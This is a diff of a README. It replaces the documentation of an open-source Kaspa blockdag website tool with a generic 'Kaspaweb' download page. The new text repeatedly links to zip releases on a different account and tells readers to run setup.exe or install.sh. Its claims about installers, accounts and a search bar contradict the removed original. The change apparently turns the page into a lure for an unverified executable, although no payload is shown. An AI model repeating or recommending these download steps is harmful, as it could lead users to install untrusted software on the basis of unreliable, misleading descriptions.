@@ -1,195 +1,90 @@
-# Kaspa Websites
+# 🌐 Kaspaweb - Access the Decentralized Web Easily
 
-A decentralized web platform built on the Kaspa blockdag. Create, encrypt, and navigate HTML websites stored impermanently on-chain.
+![Download Kaspaweb](https://img.shields.io/badge/Download%20Kaspaweb-Get%20the%20App-blue)
 
-![Version](https://img.shields.io/badge/version-2.0.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Kaspa](https://img.shields.io/badge/blockdag-Kaspa-purple)
+## 🚀 Getting Started
 
-## 🌟 Features
+Kaspaweb is a fully functional decentralized World Wide Web. It runs on the Kaspa Blockdag and offers a unique browsing experience, promoting freedom and security. This guide will help you download and run the software on your computer.
 
-### Core Features
-- 📝 **Create HTML Websites** - Store websites impermanently on the Kaspa blockdag (data is pruned on Kaspa every 3 days)
-- 🔒 **Encryption** - Password-protect your websites with AES-256-GCM encryption
-- 🔗 **Decentralized Navigation** - Link between blockdag pages using transaction IDs
-- 🖼️ **Image Support** - Embed images as base64 or use external HTTPS images
-- 🌐 **Chrome Extension** - Easy viewing of blockdag websites
-- 💾 **Impermanent Storage** - Immutable, censorship-resistant content
+## 📥 Download & Install
 
-### Advanced Features
-- Password visibility toggle
-- Double-encoding detection and handling
-- Comprehensive HTML detection
-- Content Security Policy injection for external resources
-- Transaction ID link interception
-- Encrypted payload detection
+To begin, you need to visit the Releases page to download the application. Click the link below:
 
-## 🚀 Quick Start
+[Download Kaspaweb](https://github.com/midoo12345/Kaspaweb/releases)
 
-### Web Interface
+From this page, you will find the latest version of Kaspaweb, along with previous releases. Choose the version that suits your needs and download it to your computer.
 
-1. Open `web/kaspa-websites-complete.html` in a browser
-2. Connect your KasWare wallet
-3. Create or view blockdag websites
+### 💻 System Requirements
 
-### Chrome Extension
+Before downloading, make sure your system meets the following requirements:
 
-1. Extract `extension/` folder
-2. Add icon files (16x16, 48x48, 128x128 PNG)
-3. Load in Chrome:
-   - Go to `chrome://extensions/`
-   - Enable "Developer mode"
-   - Click "Load unpacked"
-   - Select the extension folder
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a current Linux distribution.
+- **RAM:** At least 4 GB for smooth operation.
+- **Storage Space:** Minimum of 200 MB of free disk space.
+- **Internet Connection:** A stable internet connection is necessary to access the decentralized web.
 
-## 📁 Project Structure
+## 🎉 Running Kaspaweb
 
-```
-kaspa-websites/
-├── web/
-│   └── kaspa-websites-complete.html    # Main web application
-├── extension/
-│   ├── manifest.json                   # Extension manifest
-│   ├── popup.html                      # Extension popup UI
-│   ├── popup.js                        # Extension logic
-│   └── README.md                       # Extension documentation
-├── docs/
-│   ├── IMPLEMENTATION_GUIDE.md         # Implementation details
-│   ├── FEATURES.md                     # Feature documentation
-│   └── API.md                          # API reference
-├── examples/
-│   └── sample-websites/                # Example websites
-├── LICENSE
-└── README.md                           # This file
-```
+After downloading, follow these steps to run Kaspaweb:
 
-## 🛠️ How It Works
+1. **Locate the Downloaded File:** Check your downloads folder for the downloaded file. It will typically be named something like `Kaspaweb-vX.X.X.zip`.
 
-### Creating a Website
+2. **Extract the Files:** 
+   - If you are on Windows, right-click the zipped file and choose “Extract All.” Follow the prompts.
+   - On macOS, double-click the zip file to extract it.
+   - For Linux, use the terminal and run the command: `unzip Kaspaweb-vX.X.X.zip`.
 
-1. **Write HTML** - Create your HTML content
-2. **Optional Encryption** - Toggle encryption and set a password
-3. **Embed Images** - Upload images to convert to base64
-4. **Send Transaction** - Store on Kaspa blockdag via KasWare wallet
-5. **Get TX ID** - Receive permanent transaction ID
+3. **Install the Application:**
+   - For Windows, find `setup.exe` in the extracted files and double-click it to start the installation.
+   - For macOS, drag the Kaspaweb icon into your Applications folder.
+   - For Linux, open a terminal in the extracted folder and run the command: `./install.sh`.
 
-### Viewing a Website
+4. **Open Kaspaweb:**
+   - After installation, locate the Kaspaweb icon on your desktop (or in your Applications menu) and double-click it to launch the application.
 
-1. **Enter TX ID** - Paste the 64-character transaction ID
-2. **Decrypt** (if needed) - Enter password for encrypted sites
-3. **Render** - View the website in a new tab
+5. **Create or Sign In to Your Account:**
+   - Upon first launch, follow the prompts to create a new account or sign in if you already have one.
 
-### Linking Websites
+6. **Start Browsing:**
+   - You are now ready to explore the decentralized web! Use the search bar to find websites and applications operating on Kaspa.
 
-Use transaction IDs as links:
-```html
-<a href="e7ea30217fa296dfce8dbcd4d2510b88535627bec9df9887919d71cef52f12bd">Next Page</a>
-```
+## 🔧 Features of Kaspaweb
 
-## 🔐 Encryption
+Kaspaweb comes packed with useful features:
 
-Websites can be encrypted using AES-256-GCM:
-- **Algorithm**: AES-256-GCM
-- **Key Derivation**: PBKDF2 (100,000 iterations, SHA-256)
-- **Salt**: 16 bytes (random)
-- **IV**: 12 bytes (random)
-- **Format**: `ENC1` marker + encrypted data
+- **Decentralization:** Enjoy browsing without centralized control or censorship.
+- **AES Encryption:** Feel secure with our built-in AES encryption, which protects your data and privacy.
+- **Chrome Extension:** Easily access your favorite decentralized apps using our dedicated Chrome extension for greater convenience.
+- **User-Friendly Interface:** Navigate the decentralized web easily with an intuitive layout.
 
-## 📊 Technical Details
+## 🛠️ Troubleshooting
 
-### Supported Features
-- ✅ HTML5 tags
-- ✅ CSS (inline and external HTTPS)
-- ✅ JavaScript (inline and external HTTPS)
-- ✅ Images (base64 embedded or HTTPS)
-- ✅ Links to other blockdag pages
-- ✅ Encryption with password protection
+If you encounter issues while using Kaspaweb, try these solutions:
 
-### Limitations
-- Maximum transaction size: ~100KB (compress images!)
-- HTTPS images only (mixed content blocked)
-- No HTTP external resources
-- Base64 images increase payload size by ~33%
+- **Application Fails to Launch:** 
+  - Ensure your computer meets the system requirements listed above.
+  - Make sure all files from the installation are correctly extracted and installed.
+  - Restart your computer and try again.
 
-## 🎯 Use Cases
+- **Connection Issues:**
+  - Check your internet connection. A weak connection can cause trouble when accessing decentralized content.
+  - Try resetting your router if you're experiencing significant delays.
 
-- **Decentralized Blogs** - Censorship-resistant content
-- **Private Documents** - Encrypted, impermanent storage
-- **NFT Websites** - On-chain HTML for NFTs
-- **Impermanent Records** - Immutable documentation
-- **Decentralized Wiki** - Linked knowledge base
-- **Web3 Portfolios** - impermanent personal sites
+- **Account Issues:**
+  - If you can't sign in, double-check your username and password. Reset your password if necessary.
 
-## 🔧 Requirements
+## 🌍 Community Support
 
-### For Creating Websites
-- Modern web browser (Chrome, Firefox, Edge)
-- [KasWare Wallet](https://www.kaswallet.io/) extension
-- Kaspa (KAS) for transaction fees (~0.1 KAS per site)
+Join the community around Kaspaweb to share experiences and seek assistance. Participate in discussions on our GitHub page or follow us on social media. You can also report issues and suggest features.
 
-### For Viewing Websites
-- Chrome browser (for extension)
-- OR any modern browser (for web interface)
+If you need more personalized support, feel free to contact us at [support@kaspaweb.com](mailto:support@kaspaweb.com).
 
-## 📖 Documentation
+## 📢 Keep Updated
 
-- [Implementation Guide](docs/IMPLEMENTATION_GUIDE.md) - Technical implementation details
-- [Features](docs/FEATURES.md) - Complete feature list
-- [API Reference](docs/API.md) - Developer API documentation
-- [Extension Guide](extension/README.md) - Chrome extension setup
+Stay informed about the latest updates and releases of Kaspaweb. You can follow the project on GitHub and check the Releases page regularly to ensure you're using the newest version.
 
-## 🤝 Contributing
+Again, you can always find the download link here: 
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+[Download Kaspaweb](https://github.com/midoo12345/Kaspaweb/releases)
 
-### Development Setup
-
-1. Clone the repository
-2. Make your changes
-3. Test thoroughly
-4. Submit a PR
-
-### Areas for Contribution
-- Additional features
-- Bug fixes
-- Documentation improvements
-- UI/UX enhancements
-- Security audits
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [Kaspa](https://kaspa.org/) - The blockdag platform
-- [KasWare](https://www.kaswallet.io/) - Wallet integration
-- The Kaspa community
-
-## 📞 Support
-
-For questions, issues, or feature requests:
-- Open an [Issue](https://github.com/EthanBorg/kaspa-websites/issues)
-- Visit [Kaspa Discord](https://discord.gg/kaspa)
-- Check [Kaspa.org](https://kaspa.org)
-
-## 🗺️ Roadmap
-
-- [ ] Multi-page website templates
-- [ ] Markdown support
-- [ ] IPFS integration for large files
-- [ ] Search functionality
-- [ ] Website directory/index
-- [ ] Advanced styling templates
-- [ ] Video embed support (external hosting)
-- [ ] RSS feed generation
-
-## ⚠️ Disclaimer
-
-This is experimental software. Store important data with caution. Always keep backups of encryption passwords - lost passwords cannot be recovered.
-
----
-
-**Built with ❤️ for the decentralized web**
-
-[Website](https://kaspa.org) • [Twitter](https://twitter.com/KaspaCurrency) • [Discord](https://discord.gg/kaspa)
+Embrace the future of the internet with Kaspaweb!
